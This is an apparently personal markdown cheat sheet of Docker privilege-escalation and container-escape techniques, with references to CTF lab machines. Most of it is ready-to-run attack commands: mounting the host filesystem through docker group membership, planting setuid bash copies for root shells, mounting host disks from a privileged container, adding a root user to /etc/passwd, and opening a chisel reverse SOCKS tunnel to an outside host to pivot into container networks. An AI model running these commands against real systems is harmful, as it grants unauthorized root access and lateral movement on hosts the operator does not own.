- [ ] Docker Group Membership
- [ ] Docker Container Escape - Privileged Container
- [ ] Docker Container Escape - Mounted Host Dir
- [ ] Docker Container Escape - Docker Network
- [ ] Docker Socket Abuse

Docker Membership!!!
```sh
# 1. Enumeration
id
groups
# 2. Exploitation - mount host file system in a container
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# 3. RCE on the Host
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
ls -l /tmp
/tmp/bash -p
```
Docker Container Escape - Privileged Container!!!
```sh
# Determining this is a Privileged Container
fdisk -l | grep -A 10 -i "device"
cat /proc/1/status | grep -i "seccomp"
ls /dev
# Breaking Out Of The privileged Container
df -h
mkdir -p /mnt/juggernaut
mount /dev/sda5
/mnt/juggernaut
ls -l /mnt/juggernaut
# RCE
1. add a root user to /etc/passwd
2. add setuid bit on /tmp/bash
```
Docker Container Escape - Mounted Host Dir!!!
```sh
# Enumeration
findmnt
# Setuid bit on bash
cp /bin/bash /var/www/html/survey/bash
chmod +s /var/www/html/survey/bash
ls -la /opt/limesurvey
/var/www/html/survey/bash -p
# reference
forgotten machine vulnlab
```
Docker Container Escape - Docker Network!!!
```sh
for i in $(seq 1 254); do ping -c 1 172.20.0.$i & done | grep "64 bytes"
./nmap -v 172.17.0.1
wget http://172.17.0.1:3000
cat index.html -> Gitea
# Port Forwarding
./chisel server --reverse -v -p 1234 --socks5
echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf
./chisel client -v 10.10.16.15:1234 R:socks
# Test
proxychains curl -I http://172.17.0.1:3000
echo '172.17.0.1  opensource.htb' >> /etc/hosts
# reference
opensource machine htb
```
Docker Socket Abuse!!!
```sh
find / -name docker.sock -type f 2>/dev/null
find / -name *.sock -type f 2>/dev/null
```
Docker Container Escape - yyy!!!
```

```
